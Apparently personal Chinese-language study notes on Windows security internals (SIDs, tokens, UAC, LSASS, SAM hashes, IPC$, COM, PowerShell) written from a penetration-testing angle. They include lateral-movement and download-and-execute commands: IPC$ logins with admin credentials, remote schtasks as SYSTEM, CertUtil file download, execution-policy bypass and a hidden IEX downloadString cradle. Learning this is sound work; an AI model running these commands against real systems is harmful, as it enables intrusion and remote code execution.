# 权限模型

### 登录流程

> 本地登录：

1. winlogin.exe，显示登录页面，让用户输入账户/密码。
2. 调用lsass.exe，lsass.exe调用SSP，对密码进行hash。
3. 与SAM中的hash进行比较，正确就返回相关信息：用户sid，组sid，特权，登录类型等
4. lsass制作token，并分发给登录会话。

> 域登录：

> windows的权限模型可以分为 安全主体和安全对象。权限控制可以说是两者的交互。
> **安全主体**：能进行身份验证的实体，包括用户，计算机账户，拥有token的进程/线程(后面会说明)。拥有安全上下文(security context)，并能被权限控制。
> **安全对象**：系统中被操作的对象(文件/注册表/服务/设备/内核对象/进程)，每个安全对象有自己的ACL(访问控制表，决定哪些安全主体能进行哪些操作)
> 双方核心分别是token和ACL

### 安全标识符SID

> sid 用于标识安全主体/组
> 能有sid的实体：用户，计算机账户，进程/线程
> 
>sid由系统或者颁发机构(如域控)颁发，在创建时颁发

* 查看sid

  ```powershell
  whoami /user #当前用户
  Get-LocalUser -Name '' | Select-Object Name,SID #指定用户
  Get-LocalUser | Select-Object Name,SID  #所有用户
  ```

  <img src="https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260313155355834.png" style="zoom:50%;" />

  还可以再注册表中查看
  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`

* sid结构
  例如：`S-1-5-21-759784450-873590424-2550886310-1001`
  s: 表示是sid，1修订版本  5：windows代号

  ​	S-1-5 是固定开头。
  `21-759784450-873590424-2550886310` 这是随机的，用来标识计算机/域
  1001：相对标识RID，标识同一台中的不同安全主体。

* Rid
  rid的分配有规则：

  | 安全实体                 | rid   |
  | ------------------------ | ----- |
  | Administrator            | 500   |
  | Guest                    | 501   |
  | KRBTGT                   | 502   |
  | Domain Admins            | 512   |
  | Administrators(管理员组) | 544   |
  | 普通账户                 | 1000+ |

  

### 令牌Token

> token在用户登录时创建，并且进程拥有该token的副本。
> token是用来描述安全上下文的。
> 进程权限就是基于token

#### token部分组成

> 用户SID
> 用户组SID
> 拥有者SID，通常为用户sid
> 主组SID，通常是用户组的sid
> 会话SID
> 系统特权privilege，执行特殊操作,即使acl允许，也需要特权
> 默认ACL，创建对象时使用 
> token来源，token是哪个进程(继承)或登录会话创建
> token类型，
> 限制sid的可选列表
> 模拟等级(Anonymous:无法获取身份信息
> 		Identification：可以获取，但不能冒充
> 		impersonation：线程可以冒充用户访问安全实体
> 		delegation：线程可以在网络上代表用户访问
>
> ​		)
> 其他信息(token创建时间等)

#### token分类

> 对于进程，同时有两种token:主token，模拟token
>
> * 主token：从用户那里得到的副本。访问安全对象默认使用主token
> * 模拟token：线程临时模拟其他用户的token，从而访问该用户权限的资源

### UAC

> 用户访问控制(user access control)
> windows vista 之后，管理员登录创建token时会创建两份token：标准令牌(standard token) 完整令牌(full token)
> 标准令牌 只有普通的权限，当需要管理员权限时，会提升为 full token。运行软件经常会弹窗要权限就是这个。

* 等级

  > 有四个等级
  > 始终通知：每当有程序尝试安装/更改，屏幕变暗+弹窗提示
  > 仅应应用尝试更改：第三方尝试更改时触发，用户的操作不会触发。
  > 仅应应用尝试更改(不变暗)：和上面类似，但是不会变暗，只有弹窗。恶意程序可能用假的uac来骗权限
  > 从不通知：完全关闭

* 原理过程
  登录如果是管理员组，winlogon.exe调用lsass.exe的lsaLogonUser()函数，lsaLogonUser()调用SSP，进行认证。SSP返回相关数据，由NtCreateToken()制作full token，CreateRestrictedToken()接收full token，生成restrictToken。lsaLogonUser()返回两个token，默认选择restrictToken。
  
  当需要full token：进程双击/调用的是shellExcute(),参数指针型结构体，将结构体IpVerb设置为“runa”，那么这个进程就会要求管理员权限。
  触发UAC流程，consent.exe(图形化管理的，这里就是那个弹窗)会让用户确认，确认后，通过RPC(Remote process call)向AIS(Application Information Service / appinfo.dll）发送请求，调用appinfo.dll的AiLaunchAdminProcess函数，检查合法(检测tonken，用户consent确认，父进程合法性)后，AiLaunchAdminProcess将第一个参数设置为等待提权的进程路径。调用CreateProcessAsUserW函数，创建高权限进程
  
  > hook 钩取参数

## LSASS

> Local Security Authority Subsystem Service。本地安全认证子系统服务
>
> 路径在%WINDIR%/System32

* 作用

> 用户身份验证：本地/域用户登录，负责验证用户名/密码
> 			  分别通过SAM 数据库，ad验证
>
> 管理安全策略：用户锁定，特权分配
>
> token管理
>
> 与NTLM，Kerberos，degist等认证协议交互
>
> 密钥/凭着管理：Kerberos ticket，NTLM hash

win8.1之后，微软添加了Protected Process Light(PPL)，限制只有system/administrator 权限的进程访问lsass 的内存。

* 安全问题

  > 凭证窃取,

  > 病毒伪装

## SSP

Security suport Provider Interface，安全服务器提供接口。LSASS调用sspi，sspi调用ssp。

Security suport Proder：安全支持提供者。是SSPI可插拔的认证模块。本质是dll动态连接库，LSASS通过调用这些进行认证，SSP返还结果，根据结果生成token。(当然可以自己写ssp，用自己的认证协议)。

* NTLM SSP：传统的windows身份验证服务。用于win2000之前的域身份认证，非域下的本地账户认证，SMB/CIFS共享身份认证。dll是msv1_0.dll
* Kerberos SSP：win2000引入，是2000之后首选的域身份认证。dll是kerberos.dll
* Digest SSP:winXP引入，主要用于web和应用层认证。dll：wdigest
* Negotiate SSP：win2000引入。协商使用kerberos还是Ntlm。默认使用kerberos。 secur32.dll

> 不同的ssp认证的形式不同，NTLM基于质询/响应，kerberos基于Ticket。

![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260315131355603.png)

## SAM

> Security Account Manager(SAM)，管理本地账户的组件，存储所有本地用户名和hash密码。登录时，lsass接收密码，计算hash，并备份一个，然后和sam校验。

其中的账户hash格式：==username:RID:LM-HASH:Nt-HASH==
* LM-HASH
  des加密，密码不能超过14位。
* NT-HASH
  采用md4加密
```
设置用户的明文密码为ms08067。
将明文密码转换成十六进制值，即6d733038303637。
将明文密码ms08067的十六进制值6d733038303637转换成Unicode字符串，结果为6d00730030003800300036003700。
对Unicode字符串6d00730030003800300036003700进行MD4散列加密，计算结果为f10f6b3d5ee82d0bea6540c71279438c
```
 
# API

[windowAPI大全](https://blog.csdn.net/Aliven888/article/details/110942737)

# 进程


# SMB协议
Server message block 。网络消息块。微软开发的用于网络共享文件的协议。
用于两端终端之间能够共享文件，打印机，执行远程命令。

# 管道
分为匿名管道和命名管道。由内核对象管理器管理。由windows API创建。
## 匿名管道
使用CreatePipe()创建，由父进程创建。
只能本机访问。
* 访问管道
  通过createPipe()返回的句柄访问。
```c
CreateFile("\\\\.\\pipe\\管道名", ...)
```
## 命名管道
使用createNamedPipe()。
```c
UNC\管道名
CreateFile("\\\\192.168.1.10\\IPC$\\管道名", ...)
```
能通过SMB进行远程通信。机制：
通过Multiple UNC Provider (MUP)和SMB重定向器 将UNC\管道名 转为smb请求。发送到445端口。
### IPC$

IPC(Inter-Process connection) 。
用于共享 命名管道 资源。是为了进程之间通信开放的命名管道。
IPC可以验证用户名和密码，以及对应的账户权限。
通过 $ipc 可以和远程计算机建立连接。建立连接后，可以访问/上传 文件，执行命令。

> 建立一个$ipc

```powershell
net use \\192.168.1.1\ipc$ "Aa123456" /user:administrator 
```
	本质上是一个SMB共享。需要对方开启445，或139端口
> 创建计划任务

```powershell
at \\192.168.1.4 4:11PM C:\calc.bat   

#Vista及2008之后用schtasks
schtasks /create /s 192.168.1.1 /tn test /sc onstart /tr c:\calc.bat /ru system /u administrator /p Aa123456
```
> 上传文件

```powershell
copy calc.bat \\192.168.1.4\C$
```
# COM
### 简介
COM(Component Object Model)，组件对象模型。
是一个跨语言，跨机器，跨进程的二进制接口标准。实现二进制级别的代码复用
不管对方的api是那种语言，只要知道有对应的com类，就能使用对方的api。
由注册表记录信息+dll/exe文件代码组成

> 标识符：
* ProgID
  供人阅读：
```
Wscript.Shell
Excel.Application
Word.Application
```
* CLSID
  存储在注册表：`HKEY_CLASSES_ROOT`
  供机器查看：
```
  `{72C24DD5-D70A-438B-8A42-98424B88AFB8}`
```
  ### Wscript.Shell
  属于 Windows Script Host (WSH，Windows 脚本宿主) 的核心组件。对应系统文件：C:\Windows\System32\wshom.ocx

  * 功能：
    执行程序  
    读写注册表  
    发送按键
```powershell
  `Set sh = CreateObject("Wscript.Shell")`
```
### 创建/调用com
> 创建com对象
```powershell
$shell = [Activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell"))
```
> 查看对象有方法
```powershell
$shell | get-member
```
>调用
```powershell
`$shell.Popup("Hello")`
```


# 命令行工具

## net 

> **本地账户**

```bash
net user 用户名 密码 /add
net localgroup 组 用户 /add  #添加用户到组
```

[详细](https://blog.csdn.net/weixin_43303273/article/details/83029138)

| 命令                 | 作用                                           |
| -------------------- | ---------------------------------------------- |
| netstat              | 显示协议统计信息和tTCP/IP网络链接              |
| netstat -ano         | 显示进程和相应的接口                           |
| cls                  | 清屏                                           |
| cd  filename\filnaem | 进入文件                                       |
| \|                   | 链接前一个命令和后一个  netstat \| find “xxxx” |
| find                 | 查文件                                         |
| curl url             | 下载文件                                       |

## Netsh

windows自带的工具，用来修改/显示计算机网络配置

netsh有多个功能上下文，使用不同的dll来为netsh提供不同的上下文功能。
### 基础
```powershell
? #当前上下文功能
..  #上一层上下文
exec # 运行一个脚本
alias #添加别名

```
### 防火墙上下文
有两个，firewall和advfirewall，advfirewall是新版
> 添加防火墙规则

```powershell
netsh advfirewall firewall 
add rule name="仅192.168.101.0网段访问3389" dir=in action=allow protocol=TCP localport=3389 remoteip=192.168.101.0/24 profile=any enable=yes
```
### interface上下文

```powershell
netsh interface portproxy add v4tov4 listenaddress=192.168.148.135 listenport=8888 connectaddress=192.168.101.2 connectport=3389 protocol=tcp
#添加端口转发
```

## ping

默认发送4个32字节包。

| Option | 说明     |
| ------ | ------ |
| -t     | 持续发送   |
| -n     | 指定次数   |
| -l     | 指定包大小  |
| -w     | 超时响应时间 |
## wmic
主要功能为通过命令行接口执行系统管理任务及查询信息。
WMIC可以在普通用户权限下运行。
该工具已从Windows 10版本21H1及Windows Server 21H1开始被弃用，其功能被Windows PowerShell for WMI取代。
### CertUtil
Windows操作系统自带的命令行程序，作为证书服务的一部分安装，可以用于下载和显示证书颁发机构（CA）的配置信息
```powershell
CertUtil -urlcache -split -f https://ServerIp/test.exe delete
-split 下载并保存到当前路径，没有默认C:\user\用户名\
-delete 删除缓存
```
# NetBIOS
Network Basic Input/Output System，网络基本输入输出系统），可以让内网中不同的Windows计算机上运行的不间程序互相连接、分享数据。
# 事件

* 分类

> 应用程序：软件程序相关
> 系统：设置，控制面板，和基础组件(.NET等)
> 安全：用户，权限等

* 等级

> 信息:正常
> 出现故障
> 警告
> 未按期运行


# 计划任务
* schtasks
```powershell
schtasks /action /option
```
```c
/create:
    /tn	必须 taskname
    /tr	必须 程序路径
    /sc	必须 频率 
    
    /st 执行时间
    /ru 以哪个用户执行，system不需要密码，但是普通用户需要密码
    /p  密码
    /s 计算机或者ip
/query

/delete
```

# bat脚本

|       |                                          |
| ----- | ---------------------------------------- |
| echo  |                                          |
| @     | 不会显示执行的命令，只显示结果           |
| pause | 暂停，显示输入任意继续                   |
| call  | 执行另一个脚本                           |
| cmd   | 再打开一个cmd窗口 /k保持窗口，/c关闭窗口 |

# powershell

> 特点
* 默认安装。
* 脚本可以在内存中运行，不需要写入磁盘。
* 几乎不会触发杀毒软件。
* 可以远程执行。
* 运行通常不会被阻止
* 可用于管理活动目录。
### 策略

powershell 的脚本是ps1后缀。powershell默认有一个执行策略:ExecutionPolicy，
使用`Get-ExecutionPolicy` 查看，默认是remoteSigned。有以下等级：
* Restricted
  不允许运行
* remoteSigned
  只能运行本地创建的，远程下载的不能，除了有证书签名的
* Allsigned
  由受信任的发布者签名才能运行
* Unrestricted
  所有，会安全提示
* Bypass
  执行时不设置权限，且不会安全提示
用set-excutionpolicy设置等级，设置

* 绕过执行策略
```cmd
powershell.exe -Execution Bypass -File ./vuln.ps1
```
![](https://cdn.jsdmirror.cn/gh/Becorns/image/img/20260616162600452.png)
```cmd
powershell.exe -exec bypass -Command "& {import-Module .\vuln.ps1;invoke-allchecks}"
```

```powershell
powershell.exe -exec bypass -windowsStyle hidden -Noprofile -NonI IEX(new-bojectnet.webclient).downloadString("xx.ps1");

```
### 命令格式
使用 动词-名词 统一格式
如 Set-xxx，Get-xxx，Stop-xxx
Get-help，Get-Command
Get-Command  [[-Name] <string[]>]
## 常用命令
``` powershell
新建目录：New-Item shiyan221 -type "directory"
新建文件：New-Item shiyan221.txt -type "file"
删除目录：Remove-Item shiyan221
显示文本内容：Get-Content shiyan221.txt 
设置文本内容：Set-Content shiyan221.txt -value "hello,word!"
追加内容：Add-Content shiyan221.txt -value "Good good Study"
清除内容：Clear-Content shiyan221.txt
```
```powershell
依次对内网中的每个 IP 地址执行ping命令
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
/L：代表数字序列循环，@：不显示命令本身
(1,1,254)：循环规则 = (起始数，步长，结束数)
-w 1：超时时间 = 1 毫秒，-n 1：只发 1 个包

```
### new-psdrive
创建临时或持久化驱动器映射。它不仅能映射网络驱动器，还能把注册表、证书存储、变量等映射成类似文件系统的驱动器
```powershell
New-PSDrive -Name <名称> -PSProvider <提供程序> -Root <根路径> [-Credential <凭据>] [-Persist] [-Scope <作用域>]
```



# VBS
